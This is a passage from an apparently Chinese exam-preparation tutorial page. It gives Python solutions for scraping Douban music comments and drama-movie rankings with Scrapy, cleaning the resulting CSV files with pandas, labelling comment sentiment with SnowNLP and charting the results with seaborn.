comment"># 设置SimHei字体 防止中文乱码（二选一）</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>sns<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>font<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">)</span> plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>用柱状图显示各个歌手的音乐总数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'music.csv'</span><span class="token punctuation">)</span>df_geshou <span class="token operator">=</span> df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'geshou'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reset_index<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'count'</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>barplot<span class="token punctuation">(</span>data<span class="token operator">=</span>df_geshou<span class="token punctuation">,</span>x<span class="token operator">=</span><span class="token string">'geshou'</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token string">'count'</span><span class="token punctuation">)</span><span class="token comment"># df_geshou.plot(kind='bar')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>用折线图显示历年音乐平均评分走势</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'music.csv'</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>df_data <span class="token operator">=</span> df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>lineplot<span class="token punctuation">(</span>data<span class="token operator">=</span>df_data<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>rotation<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'年份'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'平均评分'</span><span class="token punctuation">)</span><span class="token comment"># df_data.plot(kind='line')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>用饼图显示各曲风音乐数占比</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'music.csv'</span><span class="token punctuation">)</span>df_data <span class="token operator">=</span> df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'qufeng'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 第一个百分号被视为字符串格式化操作符的开始，而第二个百分号被视为实际的字符</span>df_data<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'pie'</span><span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%0.2f%%'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"饼图显示各曲风音乐数占比"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="任务C：数据标注"><a href="#任务C：数据标注" class="headerlink" title="任务C：数据标注"></a>任务C：数据标注</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># (爬虫)部门是公司的核心业务部门</span><span class="token comment"># 负责创建requests对象和接受引擎发送过来的response（Downloader部门爬取到的内容），从中解析并提取出有用的数据。</span><span class="token comment"># 它对应的是爬虫流程【解析数据】和【提取数据】这两步</span><span class="token keyword">import</span> scrapy<span class="token keyword">import</span> bs4<span class="token keyword">import</span> re<span class="token comment"># 需要引用DoubanItem，它在items里面。因为是items在top250.py的上一级目录，所以要用..items，这是一个固定用法。</span><span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>items <span class="token keyword">import</span> DoubanItem<span class="token comment"># DoubanSpider类继承自scrapy.Spider类</span><span class="token keyword">class</span> <span class="token class-name">DoubanSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'music'</span>   <span class="token comment"># 定义爬虫的名字，这个名字是爬虫的唯一标识</span>    <span class="token comment"># allowed_domains是定义允许爬虫爬取的网址域名（不需要加https://）。</span>    <span class="token comment"># 如果网址的域名不在这个列表里，就会被过滤掉</span>    <span class="token comment"># 一定在book.douban.com这个域名之下，防止爬到广告页面去</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'music.douban.com'</span><span class="token punctuation">]</span>    <span class="token comment"># 定义起始网址，就是爬虫从哪个网址开始抓取</span>    <span class="token comment"># 注：allowed_domains的设定对start_urls里的网址不会有影响</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://music.douban.com/subject/1427374/comments/'</span><span class="token punctuation">]</span>    <span class="token comment"># 根据url的规律，构建出前三页地址</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'https://music.douban.com/subject/1427374/comments/?start=</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">}</span></span><span class="token string">&amp;limit=20&amp;status=P&amp;sort=new_score'</span></span>        start_urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># 解析下载器传过来的数据</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token comment"># 爬取的数据存储在response.text</span>            bs <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>            datas <span class="token operator">=</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"comment"</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> data <span class="token keyword">in</span>  datas<span class="token punctuation">:</span>                <span class="token comment">#实例化DoubanItem类。</span>                item <span class="token operator">=</span> DoubanItem<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 标题</span>                item<span class="token punctuation">[</span><span class="token string">'comment_time'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">"comment-time"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text                <span class="token comment"># 封面</span>                item<span class="token punctuation">[</span><span class="token string">'comment_content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"short"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text                <span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>对情感倾向分数大于等于0.6的评论数据标注为正向</strong></p><p><strong>对情感倾向分数大于0.4小于0.6的数据标注为中性数据</strong></p><p><strong>对情感倾向分数小于等于0.4的评论信息标注为负向</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> snownlp <span class="token keyword">import</span> SnowNLPdf <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'comment.csv'</span><span class="token punctuation">)</span><span class="token comment"># 过滤掉日期格式不对的</span>pattern <span class="token operator">=</span> <span class="token string">r'\d{4}-\d{2}-\d{2}'</span>df_fil <span class="token operator">=</span> df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'comment_time'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>contains<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">snow</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> SnowNLP<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>sentiments<span class="token operator">&gt;=</span><span class="token number">0.6</span><span class="token punctuation">:</span>        qinggan <span class="token operator">=</span> <span class="token string">'正向'</span>    <span class="token keyword">elif</span> <span class="token number">0.6</span><span class="token operator">&gt;</span>SnowNLP<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>sentiments<span class="token operator">&gt;</span><span class="token number">0.4</span><span class="token punctuation">:</span>        qinggan <span class="token operator">=</span> <span class="token string">'中性'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        qinggan <span class="token operator">=</span> <span class="token string">'负向'</span>    <span class="token keyword">return</span> qinggandf_fil<span class="token punctuation">[</span><span class="token string">'评分'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df_fil<span class="token punctuation">[</span><span class="token string">'comment_content'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>SnowNLP<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>sentiments<span class="token punctuation">)</span>df_fil<span class="token punctuation">[</span><span class="token string">'情感倾向'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df_fil<span class="token punctuation">[</span><span class="token string">'comment_content'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>snow<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df_fil<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"评分"</span><span class="token punctuation">,</span> <span class="token string">"情感倾向"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 随机抽取n行</span>df_fil<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'standard.csv'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="任务D：业务分析和方案架构设计"><a href="#任务D：业务分析和方案架构设计" class="headerlink" title="任务D：业务分析和方案架构设计"></a>任务D：业务分析和方案架构设计</h2><h3 id="子任务一：业务分析"><a href="#子任务一：业务分析" class="headerlink" title="子任务一：业务分析"></a>子任务一：业务分析</h3><p><strong>完成music_comment_all.csv评论情感分析功能，以月度未单位统计每月某电影的正向、负向评价数量，绘制折线图，并对音乐的风评趋势作出简要分析</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> seaborn <span class="token keyword">as</span> snsdf <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'standard.csv'</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'comment_time'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'comment_time'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token comment"># print(df.groupby(['comment_time','情感倾向']).size())</span><span class="token comment"># print(df.groupby('comment_time')['情感倾向'].value_counts())</span>df_data <span class="token operator">=</span> df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'comment_time'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'情感倾向'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value_counts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reset_index<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'count'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>font<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>lineplot<span class="token punctuation">(</span>data<span class="token operator">=</span>df_data<span class="token punctuation">,</span>x<span class="token operator">=</span><span class="token string">'comment_time'</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token string">'count'</span><span class="token punctuation">,</span>hue<span class="token operator">=</span><span class="token string">'情感倾向'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>rotation<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="试题3—豆瓣电影"><a href="#试题3—豆瓣电影" class="headerlink" title="试题3—豆瓣电影"></a>试题3—豆瓣电影</h1><h2 id="子任务一：数据采集-1"><a href="#子任务一：数据采集-1" class="headerlink" title="子任务一：数据采集"></a>子任务一：数据采集</h2><p>打开豆瓣豆瓣电影分类排行榜 - 剧情片（<a href="https://movie.douban.com/typerank?type_name=%E5%89%A7%E6%83%85&amp;type=11&amp;interval_id=100:90&amp;action=%EF%BC%89">https://movie.douban.com/typerank?type_name=%E5%89%A7%E6%83%85&amp;type=11&amp;interval_id=100:90&amp;action=）</a></p><p><strong>爬取剧情片排行数据前250名的数据，例如评级、排名、封面地址、可播放、id、类型、国家地区、标题、视频地址、上线日期、演员数量、观看数量、评分、演员数量、是否看过并且存入到movie.csv文件中</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># (爬虫)部门是公司的核心业务部门</span><span class="token comment"># 负责创建requests对象和接受引擎发送过来的response（Downloader部门爬取到的内容），从中解析并提取出有用的数据。</span><span class="token comment"># 它对应的是爬虫流程【解析数据】和【提取数据】这两步</span><span class="token keyword">import</span> scrapy<span class="token keyword">import</span> bs4<span class="token comment"># 需要引用DoubanItem，它在items里面。因为是items在top250.py的上一级目录，所以要用..items，这是一个固定用法。</span><span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>items <span class="token keyword">import</span> DoubanItem<span class="token comment"># DoubanSpider类继承自scrapy.Spider类</span><span class="token keyword">class</span> <span class="token class-name">DoubanSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'douban'</span>   <span class="token comment"># 定义爬虫的名字，这个名字是爬虫的唯一标识</span>    <span class="token comment"># allowed_domains是定义允许爬虫爬取的网址域名（不需要加https://）。</span>    <span class="token comment"># 如果网址的域名不在这个列表里，就会被过滤掉</span>    <span class="token comment"># 一定在book.douban.com这个域名之下，防止爬到广告页面去</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'movie.douban.com'</span><span class="token punctuation">]</span>    <span class="token comment"># 定义起始网址，就是爬虫从哪个网址开始抓取</span>    <span class="token comment"># 注：allowed_domains的设定对start_urls里的网址不会有影响</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://movie.douban.com/j/chart/top_list?type=11&amp;interval_id=100%3A90&amp;action=&amp;start=0&amp;limit=20'</span><span class="token punctuation">]</span>    <span class="token comment"># 根据url的规律，构建出前三页地址</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'https://movie.douban.com/j/chart/top_list?type=11&amp;interval_id=100%3A90&amp;action=&amp;start=</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token number">20</span><span class="token operator">*</span>x<span class="token punctuation">}</span></span><span class="token string">&amp;limit=20'</span></span>        start_urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># 解析下载器传过来的数据</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> row <span class="token keyword">in</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            item <span class="token operator">=</span> row            <span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># （数据管道）部门则是公司的数据部门</span><span class="token comment"># 只负责存储和处理Spiders部门提取到的有用数据。这个对应的是爬虫流程【存储数据】这一步。</span><span class="token keyword">import</span> scrapy<span class="token comment">#定义一个类DoubanItem，它继承自scrapy.Item</span><span class="token keyword">class</span> <span class="token class-name">DoubanItem</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># scrapy.Field() 相当于自定义字典类型</span>    rating <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    rank <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    cover_url <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    is_playable <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token builtin">id</span> <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    types <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    regions <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    title <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    release_date <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    actor_count <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    vote_count <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    score <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    actors <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    is_watched <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="子任务二：数据处理-1"><a href="#子任务二：数据处理-1" class="headerlink" title="子任务二：数据处理"></a>子任务二：数据处理</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>删除movie2.csv中删除可观看字段(is_playable)为false的数据并且存入movie2_c1_N.csv,N为删除的数据条数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span>df_fil <span class="token operator">=</span> df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'is_playable'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>N <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>df_fil<span class="token punctuation">)</span>df_fil<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'movie2_c1_</span><span class="token interpolation"><span class="token punctuation">{</span>N<span class="token punctuation">}</span></span><span class="token string">.csv'</span></span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>删除movie2.csv中删除数据源中删除演员数(actor_count)大于30的数据记录并且存入movie2_c2_N.csv,N为删除对应记录后剩余的数据条数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span>df_fil <span class="token operator">=</span> df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'actor_count'</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">30</span><span class="token punctuation">]</span>N <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>df_fil<span class="token punctuation">)</span>df_fil<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'movie2_c2_</span><span class="token interpolation"><span class="token punctuation">{</span>N<span class="token punctuation">}</span></span><span class="token string">.csv'</span></span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>将movie2.csv中国家和地区（regions）字段为多个国家和地区，将其设为该字段的第一个国家或地区值并且存入movie2_c3.csv</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'regions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'regions'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'regions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'movie2_c3.csv'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>将movie2.csv中观看数量（vote_count）统一设置为平均观看数(取整)并且存入movie2_c4_N.csv，N为平均观看数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span>N <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'vote_count'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'vote_count'</span><span class="token punctuation">]</span> <span class="token operator">=</span> N<span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'vote_count'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'movie2_c4_</span><span class="token interpolation"><span class="token punctuation">{</span>N<span class="token punctuation">}</span></span><span class="token string">.csv'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="任务B：数据分析与可视化-1"><a href="#任务B：数据分析与可视化-1" class="headerlink" title="任务B：数据分析与可视化"></a>任务B：数据分析与可视化</h2><h3 id="子任务一：数据分析-1"><a href="#子任务一：数据分析-1" class="headerlink" title="子任务一：数据分析"></a>子任务一：数据分析</h3><p><strong>分别统计各国家和地区的电影总数，展示前五名</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'regions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'regions'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'regions'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>统计各国家和地区的平均评分排名，展示前五名</strong></p><pre class="line-numbers 